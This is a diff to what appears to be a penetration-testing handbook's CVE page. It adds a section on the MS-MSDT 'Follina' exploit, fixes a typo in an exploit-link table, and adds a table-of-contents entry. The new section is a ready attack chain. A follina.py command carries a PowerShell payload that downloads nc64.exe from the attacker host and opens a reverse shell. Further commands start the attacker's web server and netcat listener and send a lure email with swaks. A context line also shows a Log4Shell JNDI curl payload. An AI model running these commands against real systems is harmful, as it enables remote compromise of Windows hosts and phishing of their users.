@@ -8,6 +8,7 @@
 - [Dirty Pipe (CVE-2022-0847)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Dirty-Pipe-CVE-2022-0847)
 - [Juicy Potato](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#juicy-potato)
 - [Log4j / Log4Shell (CVE-2021-44228)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Log4j--Log4Shell-CVE-2021-44228)
+- [MS-MSDT "Follina"](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/edit/main/handbooks/cve.md#MS-MSDT-Follina)
 - [SharpEfsPotato](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#SharpEfsPotato)
 - [Shellshock](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Shellshock)
 - [Shocker](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Shocker)
@@ -61,7 +62,7 @@
 | CVE-2022-22963 | Spring4Shell | https://github.com/tweedge/springcore-0day-en |
 | CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
 | CVE-2022-26134 | ConfluentPwn | https://github.com/redhuntlabs/ConfluentPwn |
-| CVE-2022-30190 | MS-MSDT Follina Attach Vector | https://github.com/JohnHammond/msdt-follina |
+| CVE-2022-30190 | MS-MSDT Follina Attack Vector | https://github.com/JohnHammond/msdt-follina |
 | CVE-2022-30190 | MS-MSDT Follina Exploit PoC | https://github.com/onecloudemoji/CVE-2022-30190 |
 | CVE-2022-30190 | MS-MSDT Follina Exploit Python Implementation | https://github.com/chvancooten/follina.py |
 | CVE-2022-34918 | LPE Netfilter Kernel Exploit | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
@@ -221,6 +222,26 @@ $ nc -lnvp 9001
 ```c
 $ curl 'http://<RHOST>:8983/solr/admin/cores?foo=$\{jndi:ldap://<LHOST>:1389/Exploit\}'
 ```
+## MS-MSDT "Follina"
+
+> https://github.com/JohnHammond/msdt-follina
+
+```c
+$ python3 follina.py -p 80 -c 'powershell.exe Invoke-WebRequest http://<LHOST>:8000/nc64.exe -OutFile C:\\Windows\\Tasks\\nc64.exe; C:\\Windows\\Tasks\\nc64.exe -e cmd.exe <LHOST> <LPORT>'
+```
+
+```c
+$ python3 -m http.server 8000
+```
+
+```c
+$ nc -lnvp <LPORT>
+```
+
+```c
+$ swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --body "http://<LHOST>/"
+```
+
 
 ## SharpEfsPotato
 
